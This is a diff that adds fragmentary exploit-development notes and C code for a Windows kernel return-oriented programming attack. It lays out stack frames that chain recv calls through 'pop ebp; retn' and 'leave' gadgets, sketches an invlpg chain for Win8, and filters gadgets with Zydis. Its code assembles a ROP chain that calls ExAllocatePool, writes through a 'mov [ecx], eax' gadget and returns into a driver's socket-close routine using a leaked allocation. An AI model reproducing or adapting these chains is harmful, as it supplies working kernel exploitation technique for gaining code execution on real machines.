@@ -1,0 +1,102 @@
+
+EBP_1:									  
+	functionAddr								  
+	retaddr 		= 	RecvAddr	  
+	socket										  
+	buffer										  
+	bufSize										  	
+	flag
+recv_2:
+	retaddr			= pop ebp; retn
+	socket
+	buffer	 = START_
+	bufSize		= 8
+	flag
+	ebpValue = 		(START_ - 4)						
+	gadLeave
+...											  
+stub x (0x1000)						  
+...	
+... GetRequest
+retn 8	 (pop ebp; retn )						  
+arg1 							   
+arg2							   	  
+--0x4d0---
+ebpValue 	= (START_ - 4)
+gadLeave
+...
+stub (0x500)
+...
+START_:
+	RecvAddr									  
+	retaddr				= pop ebp; retn 		  
+	socket										  
+	buf					(START_ - 0x1000 = EBP_1)					  	  
+	bufSize										   
+	flag										  
+	ebpValue = EBP_1 	(START_ - 0x1000 - 4)
+	gadLeave
+
+
+
+
+
+
+Close frame:
+
+EBP_1:
+	addrCloseSocket(ProcReq)
+	socket
+	stub x11
+	
+	
+	
+	
+if ((gad->excludedInstrs[ind].optype0 == ZYDIS_OPERAND_TYPE_REGISTER &&
+                                        gad->excludedInstrs[ind].reg0 == instrRet.operands[0].reg.value) ||
+                                        (gad->excludedInstrs[ind].optype1 == ZYDIS_OPERAND_TYPE_REGISTER &&
+                                            gad->excludedInstrs[ind].reg1 == instrRet.operands[1].reg.value) ||
+                                        (gad->excludedInstrs[ind].optype0 == ZYDIS_OPERAND_TYPE_MEMORY &&
+                                            gad->excludedInstrs[ind].reg0 == instrRet.operands[0].mem.base) ||
+                                        (gad->excludedInstrs[ind].optype1 == ZYDIS_OPERAND_TYPE_MEMORY &&
+                                            gad->excludedInstrs[ind].reg1 == instrRet.operands[1].mem.base) ||
+                                        (gad->excludedInstrs[ind].mnem == instrRet.mnemonic)) {
+										
+										
+rop invlpg Win8:
+
+0 addrPopEax
+1 eaxVal		= addrSc
+2 addrPopEbp
+3 ebpValue		= 5
+4 addrInvlpg
+5 ebpValue
+6 exitAddr
+7 - 10 stub
+11 socket
+
+ropChain[ropIndex++] = gadgets[popEcx].first; // ret -> pop ecx
+
+        ropChain[ropIndex++] = ropStub;                 // stub for retn 8
+        ropChain[ropIndex++] = ropStub;
+
+        ropChain[ropIndex++] = addrForSave;        // ecx value
+        ropChain[ropIndex++] = funcAddrs[ExAllocatePool]; // ret -> ExAllocatePool
+
+        sizeRopWords = ropIndex + (gadgets[popEcx].second / 4);
+        for (; ropIndex < sizeRopWords; ++ropIndex) {
+            ropChain[ropIndex] = ropStub;
+        }
+
+        ropChain[ropIndex++] = gadgets[movMemEcxEax].first; // ret -> mov [ecx], eax
+        ropChain[ropIndex++] = 1;           // PagedPool
+        ropChain[ropIndex++] = drLen;       // len
+
+        ropChain[ropIndex++] = glDriverBase + rva_PR_CloseSocket2;  // ret -> Exit
+
+        sizeRopWords = ropIndex + (gadgets[movMemEcxEax].second / 4);
+        for (; ropIndex < sizeRopWords; ++ropIndex) {
+            ropChain[ropIndex] = ropStub;
+        }
+
+        ropChain[ropIndex++] = leakAllocSock;
